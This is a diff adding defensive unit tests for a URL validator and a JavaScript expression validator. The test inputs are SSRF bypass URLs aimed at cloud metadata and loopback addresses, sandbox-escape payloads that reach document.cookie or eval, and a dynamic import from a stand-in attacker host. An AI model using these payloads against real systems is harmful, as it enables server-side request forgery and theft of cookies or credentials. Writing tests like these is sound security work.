@@ -39,6 +39,21 @@ describe("validateUrl", () => {
     expect(() => validateUrl("http://[::1]/path")).toThrow(ValidationError);
   });
 
+  it("rejects IPv4-mapped IPv6 SSRF bypass (0.5.2)", () => {
+    // ::ffff:169.254.169.254 → AWS metadata endpoint
+    expect(() =>
+      validateUrl("http://[::ffff:169.254.169.254]/latest/meta-data/")
+    ).toThrow(ValidationError);
+    // ::ffff:127.0.0.1 → loopback
+    expect(() => validateUrl("http://[::ffff:127.0.0.1]/")).toThrow(ValidationError);
+    // Hex form: ::ffff:a9fe:a9fe == 169.254.169.254
+    expect(() => validateUrl("http://[::ffff:a9fe:a9fe]/")).toThrow(ValidationError);
+    // IPv6 unspecified
+    expect(() => validateUrl("http://[::]/")).toThrow(ValidationError);
+    // ULA range (fd00::/8) was previously missed by ^fc00: regex
+    expect(() => validateUrl("http://[fd00::1]/")).toThrow(ValidationError);
+  });
+
   it("rejects punycode hostnames (IDN homograph prevention)", () => {
     // xn-- prefix indicates punycode encoding (IDN)
     expect(() => validateUrl("http://xn--e1awd7f.com")).toThrow(ValidationError);
@@ -122,6 +137,41 @@ describe("validateExpression", () => {
   it("rejects code execution APIs (CRIT-002)", () => {
     expect(() => validateExpression("eval('alert(1)')")).toThrow(ValidationError);
     expect(() => validateExpression("Function('return 1')()")).toThrow(ValidationError);
+  });
+
+  it("rejects bracket-notation bypasses (0.5.2)", () => {
+    expect(() => validateExpression('document["cookie"]')).toThrow(ValidationError);
+    expect(() => validateExpression("document['cookie']")).toThrow(ValidationError);
+    expect(() => validateExpression("window[`fetch`](\"https://x\")")).toThrow(
+      ValidationError
+    );
+    expect(() => validateExpression('window["eval"]("1")')).toThrow(ValidationError);
+  });
+
+  it("rejects comma-operator eval bypass (0.5.2)", () => {
+    expect(() => validateExpression("(0,eval)('alert(1)')")).toThrow(ValidationError);
+  });
+
+  it("rejects constructor chain bypass (0.5.2)", () => {
+    expect(() =>
+      validateExpression('"".constructor.constructor("return 1")()')
+    ).toThrow(ValidationError);
+    expect(() =>
+      validateExpression("({}).constructor.constructor('return 1')()")
+    ).toThrow(ValidationError);
+  });
+
+  it("rejects unicode-escape bypasses (0.5.2)", () => {
+    // \u0063 = 'c' — would decode to document.cookie
+    expect(() => validateExpression("document.\\u0063ookie")).toThrow(
+      ValidationError
+    );
+  });
+
+  it("rejects dynamic import (0.5.2)", () => {
+    expect(() => validateExpression("import('https://evil.example')")).toThrow(
+      ValidationError
+    );
   });
 });
 
